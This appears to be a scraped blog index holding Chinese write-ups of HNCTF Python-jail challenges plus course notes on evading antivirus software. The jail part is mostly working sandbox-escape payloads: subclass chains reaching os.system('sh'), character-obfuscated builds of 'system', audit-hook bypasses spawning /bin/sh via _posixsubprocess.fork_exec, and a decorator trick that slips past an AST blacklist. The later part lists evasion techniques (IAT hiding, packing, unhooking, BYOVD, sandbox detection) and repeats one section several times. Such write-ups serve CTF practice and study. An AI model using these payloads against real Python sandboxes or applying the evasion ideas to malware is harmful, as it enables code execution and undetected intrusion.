== \"__main__\": my_safe_eval(input(\"Payload:\"), type) 侧信道注入….没打通 ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:12","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#type-chnnel"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level4 #No danger function,no chr,Try to hack me!!!! #Try to read file ./flag BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr'] eval_func = eval for m in BANLIST: del __builtins__.__dict__[m] del __loader__, __builtins__ def filter(s): not_allowed = set('\"\\'`') return any(c in not_allowed for c in s) WELCOME = ''' _ _ _ _ _ _ _ _ _ | | (_) (_) (_) | | | | | || | | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | || |_ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ |__ _| | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | | | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_| |_| __/ | _/ | |___/ |__/ ''' print(WELCOME) print(\"Welcome to the python jail\") print(\"Let's have an beginner jail of calc\") print(\"Enter your expression and I will evaluate it for you.\") input_data = input(\"\u003e \") if filter(input_data): print(\"Oh hacker!\") exit(0) print('Answer: {}'.format(eval_func(input_data))) Show subclasses with tuple： ().__class__.__base__.__subclasses__() ().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh') 但’被ban了 **方法1：**利用bytes的ASCII list初始化方式 ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode()) **方法2：**利用__doc__魔术方法 可以从__doc__里面去找，用索引的方式得到想要的字符，并拼接在一起，得到我们想要的字符串。 ().__doc__如下： \"Built-in immutable sequence.\\n\\nIf no argument is given, the constructor returns an empty tuple.\\nIf iterable is specified the tuple is initialized from iterable's items.\\n\\nIf the argument is a tuple, the return value is the same object.\" 找到对应的偏移量 ().__doc__.find('s') 得到19，然后在payload里面直接使用().__doc__[19]，就得到了字符's' payload ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56]) #().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh') **方法3：**直接读flag open('flag').read() ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:13","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level4"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level4.0.5没有源码 _ _ _ _ _ _ _ _ _ ___ _____ | | (_) (_) (_) | | | | | || | / _ \\ | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | || |_| | | || |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ |__ _| | | ||___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | | |_| |_| | ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_| |_(_)\\___(_)____/ __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,\",' Good luck! \u003e calc_jail_beginner_level4的两种方法仍然可以用 ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:14","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level405"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level4.1 _ _ _ _ _ _ _ _ _ __ | | (_) (_) (_) | | | | | || |/_ | | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | || |_| | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ |__ _| | | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | | |_| | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_| |_(_)_| __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,\",' Good luck! \u003e 把bytes删掉了 Show subclasses with tuple： ().__class__.__base__.__subclasses__() 发现byte类在索引6 ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode()) #转换为 ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 1 15, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode()) ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:15","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level41"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level4.2 _ _ _ _ _ _ _ _ _ ___ | | (_) (_) (_) | | | | | || | |__ \\ | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | || |_ ) | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ |__ _| / / | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | | |_ / /_ |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_| |_(_)____| __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,\",',+ Good luck! \u003e Show subclasses with tuple： 索引byte的方法仍然可以用 ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode()) 题目将+也ban了，__doc__魔法函数的方法无法直接用 可以改变字符串的拼接方法 ''.join(['a', 'b', 'c', 'd']) payload ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]])) ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:16","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level42"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level4.3 _ _ _ _ _ _ _ _ _ ____ | | (_) (_) (_) | | | | | || | |___ \\ | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | || |_ __) | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ |__ _||__ \u003c | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | | |_ ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_| |_(_)____/ __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,\",',+ Good luck! \u003e calc_jail_beginner_level4.2的payload仍然可以用 ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode()) ().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]])) ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:17","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level43"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level5没有附件，只有回显 _ _ _ _ _ _ _ _____ | | (_) (_) (_) | | | | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ |___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____/ __/ | _/ | |___/ |__/ It's so easy challenge! Seems flag into the dir() \u003e 按题目hint输入dir()得到 \u003e dir() ['__builtins__', 'my_flag'] 随后尝试一句话RCE \u003e __import__('os').system('sh') sh: 0: can't access tty; job control turned off $ ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:18","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level5"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level5.1 _ _ _ _ _ _ _ _____ __ | | (_) (_) (_) | | | | ____/_ | | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | |__ | | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ |___ \\ | | | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |___) || | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____(_)_| __/ | _/ | |___/ |__/ It's so easy challenge! Seems flag into the dir() \u003e 尝试dir()，随后一句话RCE，发现__import__可能被删了 \u003e __import__('os').system('sh') Traceback (most recent call last): File \"/home/ctf/./server.py\", line 42, in \u003cmodule\u003e File \"/home/ctf/./server.py\", line 31, in main File \"/home/ctf/./server.py\", line 39, in repl File \"\u003cstring\u003e\", line 1, in \u003cmodule\u003e NameError: name '__import__' is not defined 尝试Show subclasses with tuple ().__class__.__base__.__subclasses__() #发现\u003cclass 'os._wrap_close'\u003e在倒数第6位 ().__class__.__base__.__subclasses__()[-6].__init__.__globals__['system']('sh') ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:19","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level51"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level6 _ _ _ _ _ _ _ __ | | (_) (_) (_) | | | | | / / | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| |/ /_ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ | '_ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | (_) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_|\\___/ __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. White list of audit hook ===\u003e builtins.input,builtins.input/result,exec,compile Some code of python jail: dict_global = dict() while True: try: input_data = input(\"\u003e \") except EOFError: print() break except KeyboardInterrupt: print('bye~~') continue if input_data == '': continue try: complie_code = compile(input_data, '\u003cstring\u003e', 'single') except SyntaxError as err: print(err) continue try: exec(complie_code, dict_global) except Exception as err: print(err) \u003e 几乎把所有的hook给ban了 参考https://ctftime.org/writeup/31883 利用_posixsubprocess.fork_exec来RCE 但如果我们直接import _posixsubprocess，会触发audit hook： Operation not permitted: import 可以通过如下方法绕过： __builtins__['__loader__'].load_module('_posixsubprocess') 或者 __loader__.load_module('_posixsubprocess') 因为是多次exec，所以我们可以输入多行代码： import os __loader__.load_module('_posixsubprocess').fork_exec([b\"/bin/sh\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:20","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level6"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level6.1 _ _ _ _ _ _ _ __ | | (_) (_) (_) | | | | | / / | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| |/ /_ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ | '_ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | (_) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_|\\___/ __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. White list of audit hook ===\u003e builtins.input,builtins.input/result,exec,compile Some code of python jail: dict_global = dict() input_code = input(\"\u003e \") complie_code = compile(input_code, '\u003cstring\u003e', 'single') exec(complie_code, dict_global) \u003e 使用海象运算符 [os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), _posixsubprocess.fork_exec([b\"/bin/sh\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)] 但是起来shell会立刻断掉 [os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b\"/bin/sh\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]] 手段也是越来越离谱 ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:21","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level61"},{"categories":["misc","wp"],"content":"\rs@Fe safeeval Warning: _curses.error: setupterm: could not find terminfo database Terminal features will not be available. Consider setting TERM variable to your current terminal name (or xterm). ______ __ _ ____ | ____| / _| | | ___ / __ \\| |__ ___ ___ __ _| |_ ___ _____ ____ _| | / __|/ / _` | __/ _ \\ / __|/ _` | _/ _ \\/ _ \\ \\ / / _` | | \\__ \\ | (_| | | | __/ \\__ \\ (_| | || __/ __/\\ V / (_| | | |___/\\ \\__,_|_| \\___| |___/\\__,_|_| \\___|\\___| \\_/ \\__,_|_| \\____/ Turing s@Fe mode: on Black List: [ 'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP', 'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET', 'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE', 'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE', 'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT', 'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE', 'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT', 'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION' ] some code: import os import sys import traceback import pwnlib.util.safeeval as safeeval input_data = input('\u003e ') print(expr(input_data)) def expr(n): if TURING_PROTECT_SAFE: m = safeeval.test_expr(n, blocklist_codes) return eval(m) else: return safeeval.expr(n) \u003e 基于代码字节码的操作码来拦截 无法直接用__import__。类似地，也没法用__builtins__这些变量。 用lambda表达式包裹起一句话RCE： (lambda: __import__('os').system('sh'))() 顺便查看一波源代码 import os import sys import traceback import pwnlib.util.safeeval as safeeval # https://github.com/Gallopsled/pwntools/blob/ef698d4562024802be5cc3e2fa49333c70a96662/pwnlib/util/safeeval.py#L3 _const_codes = [ 'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP', 'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET', 'BUILD_CONST_KEY_MAP', 'BUILD_STRING', 'LOAD_CONST','RETURN_VALUE','STORE_SUBSCR', 'STORE_MAP', 'LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE', 'DICT_UPDATE', 'DICT_MERGE', ] _expr_codes = _const_codes + [ 'UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT', 'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY', 'BINARY_DIVIDE','BINARY_FLOOR_DIVIDE','BINARY_TRUE_DIVIDE', 'BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT', 'BINARY_LSHIFT','BINARY_RSHIFT','BINARY_AND','BINARY_XOR', 'BINARY_OR', ] blocklist_codes = _expr_codes + ['MAKE_FUNCTION', 'CALL_FUNCTION'] TURING_PROTECT_SAFE = True banned = ''' [ 'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP', 'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET', 'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE', 'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE', 'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT', 'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE', 'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT', 'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION' ] ''' code = ''' import os import sys import traceback import pwnlib.util.safeeval as safeeval input_data = input('\u003e ') print(expr(input_data)) def expr(n): if TURING_PROTECT_SAFE: m = safeeval.test_expr(n, blocklist_codes) return eval(m) else: return safeeval.expr(n) ''' WELCOME = ''' ______ __ _ ____ | ____| / _| | | ___ / __ \\| |__ ___ ___ __ _| |_ ___ _____ ____ _| | / __|/ / _` | __/ _ \\ / __|/ _` | _/ _ \\/ _ \\ \\ / / _` | | \\__ \\ | (_| | | | __/ \\__ \\ (_| | || __/ __/\\ V / (_| | | |___/\\ \\__,_|_| \\___| |___/\\__,_|_| \\___|\\___| \\_/ \\__,_|_| \\____/ ''' def expr(n): if TURING_PROTECT_SAFE: m = safeeval.test_expr(n, blocklist_codes) return eval(m) else: return safeeval.expr(n) try: print(WELCOME) print('Turing s@Fe mode:', 'on' if TURING_PROTECT_SAFE else 'off') print('Black List:') print(banned) print('some code:') print(code) while True: input_data = input('\u003e ') try: print(expr(input_data)) except Exception as err: traceback.print_exc(file=sys.stdout) except EOFError as input_data: print() 在github连接中，查看test_expr的定","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:22","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#sfe-safeeval"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level7 TERM environment variable not set. _ _ _ _ _ _ _ ______ (_) (_) | | | (_) | | | |____ | _ __ _ _| | | |__ ___ __ _ _ _ __ _ __ ___ _ __ | | _____ _____| | / / | |/ _` | | | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _ \\ \\ / / _ \\ | / / | | (_| | | | | |_) | __/ (_| | | | | | | | | __/ | | | __/\\ V / __/ | / / | |\\__,_|_|_| |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| |_|\\___| \\_/ \\___|_|/_/ _/ | __/ | |__/ |___/ ================================================================================================= == Welcome to the calc jail beginner level7,It's AST challenge == == Menu list: == == [G]et the blacklist AST == == [E]xecute the python code == == [Q]uit jail challenge == ================================================================================================= G ================================================================================================= == Black List AST: == == 'Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef == == Sub,Mult,Div,Del' == ================================================================================================= Press any key to continue 根据python抽象语法树（AST）来拦截输入的 知识盲区了，目前只能照抄： 我们试着输入1+1： E Pls input your code: (last line must contain only --HNCTF) 1+1 --HNCTF ERROR: Banned statement \u003cast.Expr object at 0x7f6c147ff6d0\u003e Press any key to continue 发现的确ban了Expr，也就是展示的确实是Black List。 不能import，不能定义函数，也不能用lambda表达式，但是可以执行多行代码。这个时候，我想到了类的定义。 经过一段时间的搜索，我找到了如下writeup： https://gynvael.coldwind.pl/n/python_sandbox_escape # [organizers] Robin_Jadoul solution （不得不说Robin真的太强了，organizers太强了，是我难以企及的偶像……） @exec @input class X: pass 这份代码里面只有两个函数装饰器和一个类定义，应该不包含拦截的东西。果然，输入进去之后，程序得到了结果： E Pls input your code: (last line must contain only --HNCTF) @exec @input class X: pass --HNCTF check is passed!now the result is: \u003cclass '__main__.X'\u003e 此时再输入一句话RCE的payload： __import__('os').system('sh') 就可以拿到shell。 ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:23","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level7"},{"categories":["penetration"],"content":"星盟面纱基础 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:0:0","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#"},{"categories":["penetration"],"content":"\r测试环境搭建360对大于50mb压缩包不查杀（软件性能受限） 但解压时会进行扫描 本地多引擎检测：虚拟机不同快照环境检测 火绒（静态），360（动态），360天擎，卡巴斯基 绕360查杀需要过本地 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:1:0","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#测试环境搭建"},{"categories":["penetration"],"content":"\r杀软查杀技术","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:0","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#杀软查杀技术"},{"categories":["penetration"],"content":"\r检测方式\r1.静态分析通过对文件特征、内存进行扫描，可以检测恶意软件的静态特征。 文件静态特征、内存静态特征查杀技术 特征码：杀软通过查找恶意软件特有的二进制模式来识别 ​ VirTest 5.0 熵值检测：高熵值可能表明文件经过了加密或压缩 ​ pestudio，熵值大于7，高度混淆 文件信誉度：如360晶核对白文件的信誉度评估 导出表IAT隐藏：修改导入地址表（IAT）以隐藏函数调用 ​ StudyPE+ （x64）1.11 build112 加壳脱壳：增加额外层防止直接读取原始代码（VMP加壳） 2.动态分析通过hook技术可以实现对任意程序的监控，监控关键API调用等。 主动防御、沙箱等查杀技术。 沙箱：模拟运行环境以观察程序的行为。 识别沙箱：检测本地环境是否安装微信等社交软件 启发式扫描：杀软如果发现可以输入的参数会进行随机参数输入测试 云查杀：使用云端数据库来检测未知威胁。 进程调用链：监控进程之间的交互以发现异常行为。 API Hook技术：监控API调用来检测潜在的恶意活动。 (unhook/syscall/VEH) 3.行为分析沙箱里可以监视木马程序的行为。 杀软排除项：某些安全软件允许用户定义例外规则。(编译目录、白名单) 关闭杀毒软件：检测是否有试图关闭或禁用安全软件的动作。(w3C服务、BYOVD技术) 释放文件：进行文件读写。 网路连接：存在网络请求。 修改注册表：检测对系统注册表的非正常修改。 线程远程注入：监控是否有向其他进程注入代码的行为。 进程替换/内存隐藏：检查是否存在未授权的进程替换或内存区域隐藏。(PAGE GUARD) 堆栈欺骗：干扰堆栈跟踪，使得调试器难以跟随执行流程。 反分析：反虚拟机、反调试。 提权绕过：监控是否有尝试提升权限的行为。(烂土豆) 4.其他分析 开发过程中避免安装某些安全软件：防止源代码泄露或受到不必要的监视。 某些安全软件采用机器学习引擎(如QVM)，利用一套智能算法学习海量的病毒文件以及正常文件，得出数据模型区分病毒和正常文件，不断适应新的病毒变化。 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:1","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#检测方式"},{"categories":["penetration"],"content":"\r检测方式\r1.静态分析通过对文件特征、内存进行扫描，可以检测恶意软件的静态特征。 文件静态特征、内存静态特征查杀技术 特征码：杀软通过查找恶意软件特有的二进制模式来识别 ​ VirTest 5.0 熵值检测：高熵值可能表明文件经过了加密或压缩 ​ pestudio，熵值大于7，高度混淆 文件信誉度：如360晶核对白文件的信誉度评估 导出表IAT隐藏：修改导入地址表（IAT）以隐藏函数调用 ​ StudyPE+ （x64）1.11 build112 加壳脱壳：增加额外层防止直接读取原始代码（VMP加壳） 2.动态分析通过hook技术可以实现对任意程序的监控，监控关键API调用等。 主动防御、沙箱等查杀技术。 沙箱：模拟运行环境以观察程序的行为。 识别沙箱：检测本地环境是否安装微信等社交软件 启发式扫描：杀软如果发现可以输入的参数会进行随机参数输入测试 云查杀：使用云端数据库来检测未知威胁。 进程调用链：监控进程之间的交互以发现异常行为。 API Hook技术：监控API调用来检测潜在的恶意活动。 (unhook/syscall/VEH) 3.行为分析沙箱里可以监视木马程序的行为。 杀软排除项：某些安全软件允许用户定义例外规则。(编译目录、白名单) 关闭杀毒软件：检测是否有试图关闭或禁用安全软件的动作。(w3C服务、BYOVD技术) 释放文件：进行文件读写。 网路连接：存在网络请求。 修改注册表：检测对系统注册表的非正常修改。 线程远程注入：监控是否有向其他进程注入代码的行为。 进程替换/内存隐藏：检查是否存在未授权的进程替换或内存区域隐藏。(PAGE GUARD) 堆栈欺骗：干扰堆栈跟踪，使得调试器难以跟随执行流程。 反分析：反虚拟机、反调试。 提权绕过：监控是否有尝试提升权限的行为。(烂土豆) 4.其他分析 开发过程中避免安装某些安全软件：防止源代码泄露或受到不必要的监视。 某些安全软件采用机器学习引擎(如QVM)，利用一套智能算法学习海量的病毒文件以及正常文件，得出数据模型区分病毒和正常文件，不断适应新的病毒变化。 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:1","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#1静态分析"},{"categories":["penetration"],"content":"\r检测方式\r1.静态分析通过对文件特征、内存进行扫描，可以检测恶意软件的静态特征。 文件静态特征、内存静态特征查杀技术 特征码：杀软通过查找恶意软件特有的二进制模式来识别 ​ VirTest 5.0 熵值检测：高熵值可能表明文件经过了加密或压缩 ​ pestudio，熵值大于7，高度混淆 文件信誉度：如360晶核对白文件的信誉度评估 导出表IAT隐藏：修改导入地址表（IAT）以隐藏函数调用 ​ StudyPE+ （x64）1.11 build112 加壳脱壳：增加额外层防止直接读取原始代码（VMP加壳） 2.动态分析通过hook技术可以实现对任意程序的监控，监控关键API调用等。 主动防御、沙箱等查杀技术。 沙箱：模拟运行环境以观察程序的行为。 识别沙箱：检测本地环境是否安装微信等社交软件 启发式扫描：杀软如果发现可以输入的参数会进行随机参数输入测试 云查杀：使用云端数据库来检测未知威胁。 进程调用链：监控进程之间的交互以发现异常行为。 API Hook技术：监控API调用来检测潜在的恶意活动。 (unhook/syscall/VEH) 3.行为分析沙箱里可以监视木马程序的行为。 杀软排除项：某些安全软件允许用户定义例外规则。(编译目录、白名单) 关闭杀毒软件：检测是否有试图关闭或禁用安全软件的动作。(w3C服务、BYOVD技术) 释放文件：进行文件读写。 网路连接：存在网络请求。 修改注册表：检测对系统注册表的非正常修改。 线程远程注入：监控是否有向其他进程注入代码的行为。 进程替换/内存隐藏：检查是否存在未授权的进程替换或内存区域隐藏。(PAGE GUARD) 堆栈欺骗：干扰堆栈跟踪，使得调试器难以跟随执行流程。 反分析：反虚拟机、反调试。 提权绕过：监控是否有尝试提升权限的行为。(烂土豆) 4.其他分析 开发过程中避免安装某些安全软件：防止源代码泄露或受到不必要的监视。 某些安全软件采用机器学习引擎(如QVM)，利用一套智能算法学习海量的病毒文件以及正常文件，得出数据模型区分病毒和正常文件，不断适应新的病毒变化。 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:1","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#2动态分析"},{"categories":["penetration"],"content":"\r检测方式\r1.静态分析通过对文件特征、内存进行扫描，可以检测恶意软件的静态特征。 文件静态特征、内存静态特征查杀技术 特征码：杀软通过查找恶意软件特有的二进制模式来识别 ​ VirTest 5.0 熵值检测：高熵值可能表明文件经过了加密或压缩 ​ pestudio，熵值大于7，高度混淆 文件信誉度：如360晶核对白文件的信誉度评估 导出表IAT隐藏：修改导入地址表（IAT）以隐藏函数调用 ​ StudyPE+ （x64）1.11 build112 加壳脱壳：增加额外层防止直接读取原始代码（VMP加壳） 2.动态分析通过hook技术可以实现对任意程序的监控，监控关键API调用等。 主动防御、沙箱等查杀技术。 沙箱：模拟运行环境以观察程序的行为。 识别沙箱：检测本地环境是否安装微信等社交软件 启发式扫描：杀软如果发现可以输入的参数会进行随机参数输入测试 云查杀：使用云端数据库来检测未知威胁。 进程调用链：监控进程之间的交互以发现异常行为。 API Hook技术：监控API调用来检测潜在的恶意活动。 